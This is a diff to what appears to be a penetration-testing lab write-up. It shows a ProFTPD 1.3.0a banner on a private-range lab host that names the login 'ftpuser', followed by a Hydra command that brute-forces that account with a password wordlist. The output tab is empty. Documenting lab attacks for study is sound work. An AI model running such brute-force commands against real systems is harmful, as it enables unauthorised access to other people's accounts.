@@ -133,3 +133,28 @@ lo        Link encap:Local Loopback
 {% endtab %}
 {% endtabs %}
 
+{% hint style="info" %}
+**ftp splash screen suggests to login with 'ftpuser' while trying to connect.**
+
+```text
+ftp 172.16.37.234 40121 
+Connected to 172.16.37.234.
+220 ProFTPD 1.3.0a Server (ProFTPD Default Installation. Please use 'ftpuser' to log in.) [172.16.37.234]
+Name (172.16.37.234:kali): ftpuser
+```
+{% endhint %}
+
+{% tabs %}
+{% tab title="Hydra" %}
+```bash
+hydra -t 30 -l ftpuser -P /usr/share/seclists/Passwords/bt4-password.txt ftp://172.16.37.234:40121
+```
+{% endtab %}
+
+{% tab title="Ouput" %}
+```bash
+
+```
+{% endtab %}
+{% endtabs %}
+
